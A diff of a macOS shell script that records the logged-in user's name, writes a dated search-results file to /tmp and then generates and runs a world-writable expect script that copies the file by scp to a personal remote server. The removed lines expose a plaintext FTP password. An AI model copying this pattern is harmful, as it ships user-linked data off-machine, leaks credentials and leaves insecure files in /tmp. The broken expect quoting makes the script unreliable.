@@ -1,18 +1,11 @@
-#!/bin/sh
-
-#touch .netrc
-#chmod 700
-
-#echo "machine ftp.dennisbrowning.me" >> .netrc
-#echo "login test" >> .netrc
-#echo "password Earth123!" >> .netrc
+#!/bin/bash
 
 User=`python -c 'from SystemConfiguration import SCDynamicStoreCopyConsoleUser; import sys; username = (SCDynamicStoreCopyConsoleUser(None, None, None) or [None])[0]; username = [username,""][username in [u"loginwindow", None, u""]]; sys.stdout.write(username + "\n");'`
 
 Now=$(/bin/date +"%m-%d-%Y")
 
-touch /Library/Application\ Support/CAI/Search_Results_"$User"_$Now.txt
-Search_Results=/Library/Application\ Support/CAI/Search_Results_"$User"_$Now.txt
+touch /tmp/Search_Results_"$User"_$Now.txt
+Search_Results=/tmp/Search_Results_"$User"_$Now.txt
 
 OLD_IFS=$IFS
 IFS=$'\n'
@@ -48,11 +41,17 @@ do
 done
 IFS=$OLD_IFS
 
-
-
-#ftp -d ftp.dennisbrowning.me << ftpEOF
-#prompt
-#put $Search_Results.txt
-#quit
-#ftpEOF
-
+sleep 2
+touch /tmp/scpRun.exp
+echo "
+#!/usr/bin/expect
+	expect
+	spawn scp $Search_Results dennisjb@dennisbrowning.me:/home1/dennisjb/Search/
+	expect {
+		\".me's password:\" {send ; send "\\r"; exp_continue}
+				}" >> /tmp/scpRun.exp
+		
+sleep 2
+chmod 777 /tmp/scpRun.exp
+sleep 2		
+expect /tmp/scpRun.exp
